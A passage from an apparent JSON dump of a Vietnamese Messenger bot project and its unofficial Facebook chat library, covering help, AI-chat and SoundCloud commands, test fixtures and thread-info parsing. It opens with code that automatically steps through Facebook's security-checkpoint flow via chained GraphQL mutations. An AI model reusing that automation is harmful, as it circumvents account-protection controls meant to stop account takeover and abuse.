\"UNSUSPICIOUS\") {\n                NextToken_P2 = checkpoint.screen.token;    \n                CanResolve_P2 = true;\n                re(CanResolve_P2)\n            }\n            else {\n                CanResolve_P2 = false; \n                re(CanResolve_P2)\n            }\n        });\n    })\n\n    if (CanResolve_P1 == true) await Level_2();\n    else return CanResolve_P1;\n\n    var CanResolve_P3;\n    var NextToken_P3;\n\n    const Level_3 = () => new Promise((re, rj) => {\n        let Form_P3 ={\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 3,\n                    actor_id: ctx.userId,\n                    step: \"CHANGE_PASSWORD\", //bro where's change password :d?\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P2\n                    })\n                },\n                scale:1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P3, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonLoginDetailsConfirmationScreen\" && checkpoint.screen.contact_points.length >= 1) {\n                NextToken_P3 = checkpoint.screen.token;   \n                CanResolve_P3 = true; \n                re(CanResolve_P3) \n            }\n            else {\n                CanResolve_P3 = false;\n                rj(CanResolve_P3)\n            }\n        });\n    })\n\n    if (CanResolve_P2 == true) await Level_3();\n    else return CanResolve_P2\n    \n    var CanResolve_P4;\n    var NextToken_P4;\n\n    const Level_Final = () => new Promise((re, rj) => { \n        let Form_P4 ={\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 4,\n                    actor_id: ctx.userId,\n                    step: \"OUTRO\",\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P3\n                    })\n                },\n                scale:1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P4, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonOutroScreen\" && checkpoint.screen.fallback.uri == 'https://www.facebook.com/') {\n                NextToken_P4 = checkpoint.screen.token;    \n                CanResolve_P4 = true;\n                re(CanResolve_P4)\n            }\n            else { \n                CanResolve_P4 = false;\n                re(CanResolve_P4)\n            }\n        });\n    });\n\n    if (CanResolve_P3 == true) return await Level_Final();\n    else return (CanResolve_P3);\n}","path":null,"size_bytes":8613,"size_tokens":null},"modules/commands/help.js":{"content":"module.exports.config = {\n    name: \"help\",\n    version: \"1.1.1\",\n    hasPermssion: 0,\n    credits: \"DC-Nam\",//mod l·∫°i by t√°o t√°o\n    description: \"Xem danh s√°ch l·ªánh v√† info\",\n    commandCategory: \"Danh s√°ch l·ªánh\",\n    usages: \"[t√™n l·ªánh/all]\",\n    cooldowns: 5\n};\nmodule.exports.languages = {\n    \"vi\": {},\n    \"en\": {}\n}\nmodule.exports.run = async function({\n    api,\n    event,\n    args,\n  Currencies,\n  __GLOBAL\n}) {\nconst { events } = global.client;\n  const time = process.uptime(),\n\t\thours = Math.floor(time / (60 * 60)),\n\t\tminutes = Math.floor((time % (60 * 60)) / 60),\n\t\tseconds = Math.floor(time % 60);\n  var z_1 = (hours < 10) ? '0' + hours : hours;\n    var x_1 = (minutes < 10) ? '0' + minutes : minutes;\n    var y_1 = (seconds < 10) ? '0' + seconds : seconds;\nconst moment = require(\"moment-timezone\");\n  const timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY || HH:mm:ss\");\n  const { commands } = global.client;\n    const {\n        threadID: tid,\n        messageID: mid,\n        senderID: sid\n    } = event\n    var type = !args[0] ? \"\" : args[0].toLowerCase()\n    var msg = \"\",\n        array = [],\n        i = 0\n    const cmds = global.client.commands\n    const TIDdata = global.data.threadData.get(tid) || {}\n    var prefix = TIDdata.PREFIX || global.config.PREFIX\n    if (type == \"all\") {\n        for (const cmd of cmds.values()) {\n            msg += `[${++i}]-> ${cmd.config.name}: ${cmd.config.description}\\n-----------------------\\n`\n        }\n        return api.sendMessage(msg, tid, mid)\n    }\n    if (type == \"all\") return\n    if (type) {\n        for (const cmd of cmds.values()) {\n            array.push(cmd.config.name.toString())\n        }\n        if (!array.find(n => n == args[0].toLowerCase())) {\n            const stringSimilarity = require('string-similarity')\n            commandName = args.shift().toLowerCase() || \"\"\n            var allCommandName = [];\n            const commandValues = cmds['keys']()\n            for (const cmd of commandValues) allCommandName.push(cmd)\n            const checker = stringSimilarity.findBestMatch(commandName, allCommandName)\n            if (checker.bestMatch.rating >= 0.5) command = client.commands.get(checker.bestMatch.target)\n            msg = `=== „Äé HELP „Äè ===\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n[‚ú®] ‚ûú Kh√¥ng t√¨m th·∫•y l·ªánh '${type}' trong h·ªá th·ªëng.\\n[‚ú®] ‚ûú L·ªánh g·∫ßn gi·ªëng ƒë∆∞·ª£c t√¨m th·∫•y '${checker.bestMatch.target}'`\n            api.sendMessage(msg, tid, mid)\n        }\n        const cmd = cmds.get(type).config\n        msg = `[üß∏] ‚ûú ùóßùó≤ÃÇùóª: ${cmd.name} ( ${cmd.version} )\\n[üîó] ‚ûú ùó§ùòÇùòÜùó≤ÃÇÃÄùóª ùóµùóÆÃ£ùóª: ${TextPr(cmd.hasPermssion)}\\n[üë§] ‚ûú ùóßùóÆÃÅùó∞ ùó¥ùó∂ùóÆÃâ: ${cmd.credits}\\n[üí¨] ‚ûú ùó†ùóºÃÇ ùòÅùóÆÃâ: ${cmd.description}\\n[üß©] ‚ûú ùóßùóµùòÇùóºÃ£ÃÇùó∞ ùóªùóµùóºÃÅùó∫: ${cmd.commandCategory}\\n[üåü] ‚ûú ùóñùóÆÃÅùó∞ùóµ ùòÄùòÇÃõÃâ ùó±ùòÇÃ£ùóªùó¥: ${cmd.usages}\\n[‚è∞] ‚ûú ùóßùóµùóºÃõÃÄùó∂ ùó¥ùó∂ùóÆùóª ùó∞ùóµùóºÃõÃÄ: ${cmd.cooldowns}s`\n        api.sendMessage(msg, tid, mid)\n    } else {\n        CmdCategory()\n        array.sort(S(\"nameModule\"))\n        for (const cmd of array) {\n          msg1 = `======„Äé ùóõùóòùóüùó£ ùóñùó¢ùó†ùó†ùóîùó°ùóó „Äè======\\n\\n`\n            msg += `[üíù] ‚ûú ùóßùóµùòÇùóºÃÇÃ£ùó∞ ùó°ùóµùóºÃÅùó∫: ${cmd.cmdCategory.toUpperCase()}\\n[üß∏] ‚ûú ùóßùóºÃÇÃâùóªùó¥: ${cmd.nameModule.length} ùóπùó≤Ã£ÃÇùóªùóµ\\n[‚ú®]‚ûú ùóüùó≤Ã£ÃÇùóªùóµ ùóªùóÆÃÄùòÜ ùóæùòÇùòÜùó≤ÃÇÃÄùóª ùóµùóÆÃ£ùóª ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùóµùóÆÃ£ùóª ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùó∞ùóºÃÅ ùòÅùóµùó≤ÃÇÃâ ùó±ùòÇÃÄùóªùó¥: ${TextPr(cmd.permission)}\\n[üîé] ‚ûú ùóñùóÆÃÅùó∞ ùóπùó≤Ã£ÃÇùóªùóµ: ${cmd.nameModule.join(\", \")}\\n\\n`\n        }\n        msg += `[üîó] ‚ûú ùó¶ùóºÃÇÃÅ ùóπùó≤ÃÇÃ£ùóªùóµ ùóµùó∂ùó≤ÃÇÃ£ùóª ùòÅùóÆÃ£ùó∂ ùóØùóºùòÅ ƒëùóÆùóªùó¥ ùó∞ùóºÃÅ: ${cmds.size}\\n[üòª] ‚ûú ùóïùóÆÃ£ùóª ùòÅùóµùóÆÃâ ùó∞ùóÆÃâùó∫ ùòÖùòÇÃÅùó∞ \"‚ù§Ô∏è\" ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùòÅùóµùóºÃÇùóªùó¥ ùòÅùó∂ùóª ùóµùó≤ÃÇÃ£ ùòÅùóµùóºÃÇÃÅùóªùó¥ ùóØùóºùòÅ\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n[üíú] ‚ûú ùóñùóÆÃÅùó∞ùóµ ùòÄùòÇÃõÃâ ùó±ùòÇÃ£ùóªùó¥: ùó±ùòÇÃÄùóªùó¥ \"${prefix}ùóµùó≤ùóπùóΩ + ùòÅùó≤ÃÇùóª ùóπùó≤ÃÇÃ£ùóªùóµ\" ƒëùó≤ÃÇÃâ ùòÖùó≤ùó∫ ùó∞ùóµùó∂ ùòÅùó∂ùó≤ÃÇÃÅùòÅ ùó∞ùóÆÃÅùó∞ùóµ ùó±ùòÇÃÄùóªùó¥ ùóπùó≤ÃÇÃ£ùóªùóµ\\n[üíô] ‚ûú ùóñùóÆÃÅùó∞ùóµ ùòÄùòÇÃõÃâ ùó±ùòÇÃ£ùóªùó¥: ùó±ùòÇÃÄùóªùó¥ \"${prefix}ùóµùó≤ùóπùóΩ ùóÆùóπùóπ\" ƒëùó≤ÃÇÃâ ùòÖùó≤ùó∫ ùóÆùóπùóπ ùóπùó≤ÃÇÃ£ùóªùóµ ùó∞ùóºÃÅ ùòÅùóøùó≤ÃÇùóª ùóØùóºùòÅ\\n\\n‚è∞===„Äé ${timeNow} „Äè===‚è∞`\n        api.sendMessage({body: msg1 + msg, attachment: (await global.nodemodule[\"axios\"]({\nurl: (await global.nodemodule[\"axios\"]('https://webapi.chaocacbannhe.repl.co/phongcanh')).data.data,\nmethod: \"GET\",\nresponseType: \"stream\"\n})).data\n},event.threadID, (err, info) => {\n    global.client.handleReaction.push({\n      name: this.config.name, \n      messageID: info.messageID,\n      author: event.senderID,\n    })\n    },event.messageID);\n    }\n  module.exports.handleReaction = async ({ event, api, handleReaction, Currencies, Users}) => {\nconst axios = global.nodemodule[\"axios\"];\nconst fs = global.nodemodule[\"fs-extra\"];\nconst { threadID, messageID, userID } = event;\nif (event.userID != handleReaction.author) return;\nif (event.reaction != \"‚ù§\") return; \n api.unsendMessage(handleReaction.messageID);\n        var msg = `===== [ ùóßùóõùó¢ÃÇùó°ùóö ùóßùóúùó° ùóïùó¢ùóß ] =====\\n\\n[üíÆ] ‚ûú ùóõùó∂ùó≤ÃÇÃ£ùóª ùòÅùóÆÃ£ùó∂ ùóØùóºùòÅ  ƒëùóÆÃÉ ùóºùóªùóπ ƒëùòÇÃõùóºÃõÃ£ùó∞ ${hours} ùóöùó∂ùóºÃõÃÄ ${minutes} ùó£ùóµùòÇÃÅùòÅ ${seconds} ùóöùó∂ùóÆÃÇùòÜ\\n[‚öôÔ∏è] ‚ûú ùó£ùóµùó∂ùó≤ÃÇùóª ùóØùóÆÃâùóª ùóµùó∂ùó≤ÃÇÃ£ùóª ùòÅùóÆÃ£ùó∂ ùó∞ùòÇÃâùóÆ ùóØùóºùòÅ: ${global.config.version}\\n[üîó] ‚ûú ùóßùóºÃÇÃâùóªùó¥ ùóπùó≤ÃÇÃ£ùóªùóµ: ${commands.size}\\nüñ®Ô∏è ùóõùó∂ùó≤ÃÇÃ£ùóª ùòÅùóÆÃ£ùó∂ ùó∞ùóºÃÅ: ${events.size} ùóπùó≤ÃÇÃ£ùóªùóµ ùòÄùòÇÃõÃ£ ùó∏ùó∂ùó≤ÃÇÃ£ùóª\\n[üë•] ‚ûú ùóßùóºÃÇÃâùóªùó¥ ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùó±ùòÇÃÄùóªùó¥: ${global.data.allUserID.length}\\n[üèòÔ∏è] ‚ûú ùóßùóºÃÇÃâùóªùó¥ ùóªùóµùóºÃÅùó∫: ${global.data.allThreadID.length}\\n[üíì] ‚ûú ùó£ùóøùó≤ùó≥ùó∂ùòÖ ùóØùóºùòÅ: ${prefix}`\n        return api.sendMessage({body: msg, attachment: (await global.nodemodule[\"axios\"]({\nurl: (await global.nodemodule[\"axios\"]('https://webapi.chaocacbannhe.repl.co/phongcanh')).data.data,\nmethod: \"GET\",\nresponseType: \"stream\"\n})).data\n},event.threadID); \n  }\n    function CmdCategory() {\n        for (const cmd of cmds.values()) {\n            const {\n                commandCategory,\n                hasPermssion,\n                name: nameModule\n            } = cmd.config\n            if (!array.find(i => i.cmdCategory == commandCategory)) {\n                array.push({\n                    cmdCategory: commandCategory,\n                    permission: hasPermssion,\n                    nameModule: [nameModule]\n                })\n            } else {\n                const find = array.find(i => i.cmdCategory == commandCategory)\n                find.nameModule.push(nameModule)\n            }\n        }\n    }\n}\n\nfunction S(k) {\n    return function(a, b) {\n        let i = 0;\n        if (a[k].length > b[k].length) {\n            i = 1\n        } else if (a[k].length < b[k].length) {\n            i = -1\n        }\n        return i * -1\n    }\n}\n\nfunction TextPr(permission) {\n    p = permission\n    return p == 0 ? \"Th√†nh Vi√™n\" : p == 1 ? \"Qu·∫£n tr·ªã vi√™n\" : p = 2 ? \"ADMINBOT\" : \"To√†n Quy·ªÅn\"\n      }","path":null,"size_bytes":7765,"size_tokens":null},"modules/commands/xaoai.js":{"content":"const axios = require('axios'); \nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"xaoai\",\n    version: \"1.1.1\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi Cat AI\",\n    commandCategory: \"AI\",\n    usages: \"xaoai n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, '/data/api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.xaoai || jsonData.xaoai.trim() === '') {\n            return null;\n        }\n        return jsonData.xaoai;\n    } catch {\n        return null;\n    }\n};\n\nconst getChatResponse = async (text) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        throw new Error(\"ƒêang c·∫≠p nh·∫≠t!!!\");\n    }\n\n    for (let uid = 1; uid <= 9; uid++) {\n        try {\n            const response = await axios.get(`${apiUrl}?prompt=${encodeURIComponent(text)}&uid=${uid}`);\n            if (response.data && response.data.result) {\n                return response.data.result;\n            }\n        } catch {\n            continue;\n        }\n    }\n\n    throw new Error(\"T·∫•t c·∫£ c√°c UID ƒë·ªÅu kh√¥ng ph·∫£n h·ªìi, vui l√≤ng th·ª≠ l·∫°i sau.\");\n};\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) return reject(error);\n                resolve(info.messageID);\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) return reject(error);\n                    resolve(info.messageID);\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleEvent = async function ({ api, event }) {\n    if (event.type === \"message_reply\") {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3164,"size_tokens":null},"lib/soundcloud.js":{"content":"const axios = require('axios');\nasync function getData(url) {\n    var { data } = await axios(`https://api.phamvandien.xyz/soundcloud?url=${encodeURI(url)}`);\n    return data\n}\n\nasync function search(keywords, limit) {\n    var { data } = await axios.get(`https://api.phamvandien.xyz/soundcloud?search=${encodeURI(keywords)}&limit=${limit || 10}`);\n    return data\n}\nmodule.exports = {\n    getData,\n    search\n}","path":null,"size_bytes":409,"size_tokens":null},"lib/Fca-Horizon-Remastered/Func/AcceptAgreement.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar database = require('../Extra/Database');\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (args,callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n            if (database(true).get('agreement') == true) {\n                callback(null, \"Accecpt\");\n            }\n            else {\n                database(true).set('agreement', true);\n                var Form = \"=== Horizon end-user license agreement ===\\n\\n Free to use and edited ‚ú®\";\n                callback(null, Form);\n            }\n        return returnPromise;\n    };\n};\n","path":null,"size_bytes":1014,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/data/shareAttach.js":{"content":"module.exports = {\n  \"delta\": {\n    \"attachments\": [\n      {\n        \"fbid\": \"1522004821162174\",\n        \"id\": \"1522004821162174\",\n        \"mercury\": {\n          \"app_attribution\": null,\n          \"attach_type\": \"share\",\n          \"name\": null,\n          \"url\": null,\n          \"rel\": null,\n          \"preview_url\": null,\n          \"preview_width\": null,\n          \"preview_height\": null,\n          \"large_preview_url\": null,\n          \"large_preview_width\": null,\n          \"large_preview_height\": null,\n          \"icon_type\": null,\n          \"metadata\": null,\n          \"thumbnail_url\": null,\n          \"share\": {\n            \"description\": null,\n            \"media\": {\n              \"animated_image\": null,\n              \"animated_image_size\": {\n                \"height\": null,\n                \"width\": null\n              },\n              \"image\": null,\n              \"image_size\": {\n                \"height\": null,\n                \"width\": null\n              },\n              \"duration\": null,\n              \"playable\": null,\n              \"source\": null\n            },\n            \"source\": \"Dimon - testing\",\n            \"style_list\": [\n              \"business_message_items\", \"fallback\"\n            ],\n            \"title\": \"search engines\",\n            \"properties\": null,\n            \"uri\": null,\n            \"subattachments\": [],\n            \"deduplication_key\": \"abcde\",\n            \"action_links\": [],\n            \"share_id\": \"1522004821162174\",\n            \"target\": {\n              \"call_to_actions\": [],\n              \"items\": [\n                {\n                  \"id\": \"629934437209008\",\n                  \"name\": \"search engines\",\n                  \"desc\": \"\",\n                  \"thumb_url\": null,\n                  \"item_url\": null,\n                  \"title\": \"search engines\",\n                  \"text\": \"\",\n                  \"source\": null,\n                  \"metalines\": {\n                    \"metaline_1\": \"click to get redirected\",\n                    \"metaline_2\": null,\n                    \"metaline_3\": null\n                  },\n                  \"location\": 12314,\n                  \"category\": 69,\n                  \"call_to_actions\": [\n                    {\n                      \"action_link\": \"http://l.facebook.com/l.php?u=http%3A%2F%2Fgoogle.com%2F&h=ATNziCq_-6I3ZPYwwLluFdCrWMEwLLKvokFlXdEdS4LD2Lzsv2cR2SJYffJcDYBfB092Xeq8oRdftJk4husEYVduH24RnlP3HvVQOkOrciXDs2M7TkWYyNLBelvJ2Fc-mw8pbGy5NslGf_fkZ_A\",\n                      \"action_type\": 2,\n                      \"id\": \"FFD=\",\n                      \"title\": \"Google\",\n                      \"link_target_ids\": [629934437209008],\n                      \"is_mutable_by_server\": false,\n                      \"should_show_user_confirmation\": false,\n                      \"confirmation_title\": null,\n                      \"confirmation_message\": null,\n                      \"confirmation_continue_label\": null,\n                      \"confirmation_cancel_label\": null,\n                      \"payment_metadata\": {\n                        \"total_price\": null,\n                        \"payment_module_config\": null\n                      },\n                      \"is_disabled\": false\n                    }, {\n                      \"action_link\": \"http://l.facebook.com/l.php?u=http%3A%2F%2Fyahoo.com%2F&h=ATNIuTf7iDGP5xXTWOAdhaGhRFfDf4eS09t_G9CrR0MDiBKpqtCDzPf_9y5Bq7TXMgmo6RttztsgeO0ReSc0PDvJDTa1fLMMK2CjrpkqC91_m-yaMXfeQ4aI6MbhZrOPnK3YFnQP4XvRx3N1udE\",\n                      \"action_type\": 2,\n                      \"id\": \"CDE=\",\n                      \"title\": \"Yahoo\",\n                      \"link_target_ids\": [629934437209008],\n                      \"is_mutable_by_server\": false,\n                      \"should_show_user_confirmation\": false,\n                      \"confirmation_title\": null,\n                      \"confirmation_message\": null,\n                      \"confirmation_continue_label\": null,\n                      \"confirmation_cancel_label\": null,\n                      \"payment_metadata\": {\n                        \"total_price\": null,\n                        \"payment_module_config\": null\n                      },\n                      \"is_disabled\": false\n                    }, {\n                      \"action_link\": \"http://l.facebook.com/l.php?u=http%3A%2F%2Fbing.com%2F&h=ATMoMijAt6Da6WWIQ679DhZyZizWdxAViWwyl-RjKobFUG_x8GmB8LD6pPa3KP5K1-QTL9vuaFwjqB0itaMFWk4VwQ9uh56JgnbFnAo4qM_CrQufgLeHwwCnWSCnZt8IzYT4y6YULLLFA5bL1H4\",\n                      \"action_type\": 2,\n                      \"id\": \"ABC=\",\n                      \"title\": \"Bing\",\n                      \"link_target_ids\": [629934437209008],\n                      \"is_mutable_by_server\": false,\n                      \"should_show_user_confirmation\": false,\n                      \"confirmation_title\": null,\n                      \"confirmation_message\": null,\n                      \"confirmation_continue_label\": null,\n                      \"confirmation_cancel_label\": null,\n                      \"payment_metadata\": {\n                        \"total_price\": null,\n                        \"payment_module_config\": null\n                      },\n                      \"is_disabled\": false\n                    }\n                  ]\n                }\n              ],\n              \"location\": 132145,\n              \"category\": 69,\n              \"message\": \"Aaa: search engines\"\n            }\n          }\n        },\n        \"otherUserFbIds\": [\"1521994257829897\"],\n        \"titanType\": 1\n      }\n    ],\n    \"messageMetadata\": {\n      \"actorFbId\": \"1345\",\n      \"messageId\": \"mid.12345:asdv\",\n      \"offlineThreadingId\": \"1345v1345\",\n      \"tags\": [\"source:messenger:commerce\"],\n      \"threadKey\": {\n        \"otherUserFbId\": \"13451345\"\n      },\n      \"timestamp\": \"1487078180265\"\n    }\n  }\n};\n","path":null,"size_bytes":5734,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Dev_getThreadInfoOLD.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var { capture } = require('../Extra/Src/Last-Run');\n  var Database = require('../Extra/Database');\n  global.Fca.Data.Userinfo = [];\n  \n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n      // ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n      // nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n      // ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n      //c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    var SpecialMethod = function(TID) {\n      const All = getAll();\n      const Real = [];\n      const Average = [];\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          if (i.data.TimeCreate + 900 * 1000 <= 